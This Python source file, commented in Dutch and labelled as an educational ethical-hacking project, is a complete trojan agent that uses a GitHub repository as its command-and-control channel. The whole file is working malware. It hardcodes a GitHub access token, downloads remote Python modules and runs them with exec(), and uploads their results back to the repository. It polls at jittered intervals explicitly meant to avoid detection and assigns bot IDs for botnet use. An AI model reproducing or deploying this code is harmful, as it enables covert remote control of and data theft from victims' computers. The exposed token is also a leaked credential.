"""
Trojan Agent met GitHub Integratie
Educatief project - Ethical Hacking
ALLEEN GEBRUIKEN IN EEN VIRTUELE OMGEVING OF SANDBOX!
"""

import base64
import importlib
import json
import random
import sys
import threading
import time
import os
import subprocess
from datetime import datetime
from github import Github


# Configuratie
GITHUB_TOKEN = "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"
GITHUB_REPO = "Darkknin12/trojanvirus"
TROJAN_ID = f"trojan_{random.randint(1000, 9999)}"  # Unieke ID per client

def check_dependencies():
    """Controleer en installeer ontbrekende dependencies automatisch (alleen als script)"""
    # Als het een .exe is (frozen), kunnen we geen pip install doen
    if getattr(sys, 'frozen', False):
        return

    dependencies = {
        "PyGithub": "github",
        "Pillow": "PIL",
        "mss": "mss",
        "psutil": "psutil",
        "pyautogui": "pyautogui"
    }
    
    for package, import_name in dependencies.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"[*] Dependency {package} ontbreekt. Installeren...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"[+] {package} succesvol geïnstalleerd.")
            except Exception as e:
                print(f"[!] Kon {package} niet installeren: {e}")

# Voor botnet ondersteuning - genereer unieke ID gebaseerd op systeem
def genereer_unieke_id():
    """Genereer een unieke ID voor deze trojan client"""
    import hashlib
    import platform
    
    # Combineer systeem info voor unieke ID
    info = f"{platform.node()}-{platform.machine()}-{os.getlogin()}"
    hash_id = hashlib.md5(info.encode()).hexdigest()[:8]
    return f"bot_{hash_id}"


class GitHubConnector:
    """Klasse voor communicatie met GitHub repository"""
    
    def __init__(self, token, repo_naam):
        self.github = Github(token)
        self.repo = self.github.get_repo(repo_naam)
        self.branch = "main"
    
    def haal_bestand_op(self, pad):
        """Haal bestandsinhoud op van GitHub"""
        try:
            bestand = self.repo.get_contents(pad, ref=self.branch)
            # Decodeer van base64
            return base64.b64decode(bestand.content).decode('utf-8')
        except Exception as e:
            print(f"[!] Fout bij ophalen {pad}: {e}")
            return None
    
    def stuur_data(self, pad, data, bericht="Data update"):
        """Stuur data terug naar de GitHub repository"""
        try:
            # Check of bestand al bestaat
            try:
                bestand = self.repo.get_contents(pad, ref=self.branch)
                # Update bestaand bestand
                self.repo.update_file(
                    pad,
                    bericht,
                    data,
                    bestand.sha,
                    branch=self.branch
                )
            except:
                # Maak nieuw bestand
                self.repo.create_file(
                    pad,
                    bericht,
                    data,
                    branch=self.branch
                )
            print(f"[+] Data verstuurd naar {pad}")
            return True
        except Exception as e:
            print(f"[!] Fout bij versturen data: {e}")
            return False
    
    def haal_config_op(self, trojan_id):
        """Haal configuratie op voor specifieke trojan"""
        config_pad = f"config/{trojan_id}.json"
        inhoud = self.haal_bestand_op(config_pad)
        
        if inhoud:
            return json.loads(inhoud)
        
        # Probeer algemene config als fallback
        algemene_config = self.haal_bestand_op("config/config.json")
        if algemene_config:
            return json.loads(algemene_config)
        
        return None


class ModuleLader:
    """Custom importer voor het laden van modules van GitHub"""
    
    def __init__(self, github_connector):
        self.connector = github_connector
        self.geladen_modules = {}
    
    def laad_module(self, module_naam):
        """Laad een module van GitHub en voer uit"""
        # Check cache
        if module_naam in self.geladen_modules:
            return self.geladen_modules[module_naam]
        
        # Haal module code op van GitHub
        module_pad = f"modules/{module_naam}.py"
        code = self.connector.haal_bestand_op(module_pad)
        
        if not code:
            print(f"[!] Kon module {module_naam} niet laden")
            return None
        
        # Maak nieuwe module object
        spec = importlib.util.spec_from_loader(module_naam, loader=None)
        module = importlib.util.module_from_spec(spec)
        
        # Voer de code uit in module namespace
        try:
            exec(code, module.__dict__)
            self.geladen_modules[module_naam] = module
            print(f"[+] Module {module_naam} succesvol geladen")
            return module
        except Exception as e:
            print(f"[!] Fout bij uitvoeren module {module_naam}: {e}")
            return None
    
    def voer_module_uit(self, module_naam, params=None):
        """Voer een geladen module uit"""
        module = self.laad_module(module_naam)
        
        if module and hasattr(module, 'run'):
            try:
                resultaat = module.run(params or {})
                return resultaat
            except Exception as e:
                print(f"[!] Fout tijdens uitvoeren {module_naam}: {e}")
                return {"error": str(e)}
        return None


class TrojanAgent:
    """Hoofdklasse voor de Trojan Agent"""
    
    def __init__(self):
        self.id = genereer_unieke_id()
        self.connector = None
        self.lader = None
        self.actief = True
        
        # Poll interval met randomisatie (30-90 sec)
        self.min_interval = 30
        self.max_interval = 90
    
    def verbind(self):
        """Maak verbinding met GitHub"""
        try:
            self.connector = GitHubConnector(GITHUB_TOKEN, GITHUB_REPO)
            self.lader = ModuleLader(self.connector)
            print(f"[+] Verbonden met GitHub als {self.id}")
            return True
        except Exception as e:
            print(f"[!] Verbindingsfout: {e}")
            return False
    
    def krijg_random_interval(self):
        """Genereer random interval om detectie te voorkomen"""
        basis = random.randint(self.min_interval, self.max_interval)
        # Voeg extra randomisatie toe
        jitter = random.uniform(-5, 5)
        return max(10, basis + jitter)
    
    def verwerk_config(self, config):
        """Verwerk de configuratie en voer modules uit"""
        if not config:
            print("[*] Geen configuratie gevonden, slapend...")
            return
        
        modules = config.get("modules", [])
        
        if not modules:
            print("[*] Geen modules om uit te voeren, slapend...")
            return
        
        print(f"[*] {len(modules)} module(s) gevonden in config")
        
        for module_config in modules:
            naam = module_config.get("naam")
            params = module_config.get("params", {})
            
            if not naam:
                continue
            
            print(f"[*] Uitvoeren module: {naam}")
            resultaat = self.lader.voer_module_uit(naam, params)
            
            if resultaat:
                # Stuur resultaten terug naar data folder
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                data_pad = f"data/{self.id}/{naam}_{timestamp}.json"
                
                data_json = json.dumps(resultaat, indent=2, default=str)
                self.connector.stuur_data(
                    data_pad, 
                    data_json, 
                    f"Resultaat van {naam}"
                )
    
    def hoofd_loop(self):
        """Hoofdloop - poll config en voer modules uit"""
        print(f"[*] Trojan gestart met ID: {self.id}")
        
        while self.actief:
            try:
                # Haal configuratie op
                config = self.connector.haal_config_op(self.id)
                
                # Verwerk config
                self.verwerk_config(config)
                
            except Exception as e:
                print(f"[!] Fout in hoofdloop: {e}")
            
            # Wacht random interval
            wacht_tijd = self.krijg_random_interval()
            print(f"[*] Volgende check over {wacht_tijd:.0f} seconden...")
            time.sleep(wacht_tijd)
    
    def start(self):
        """Start de trojan in een aparte thread"""
        if not self.verbind():
            print("[!] Kon niet starten, verbinding mislukt")
            return False
        
        # Start hoofdloop in thread
        thread = threading.Thread(target=self.hoofd_loop, daemon=True)
        thread.start()
        return True
    
    def stop(self):
        """Stop de trojan"""
        self.actief = False
        print("[*] Trojan gestopt")


def main():
    """Hoofdfunctie"""
    print("=" * 50)
    print("  EDUCATIEVE TROJAN - ALLEEN VOOR LEREN!")
    print("  Test alleen in virtuele omgeving!")
    print("=" * 50)
    
    # Controleer dependencies voor start
    check_dependencies()
    
    agent = TrojanAgent()
    
    if agent.start():
        try:
            # Houd main thread actief
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Afsluiten...")
            agent.stop()
    else:
        print("[!] Kon trojan niet starten")
        sys.exit(1)


if __name__ == "__main__":
    main()
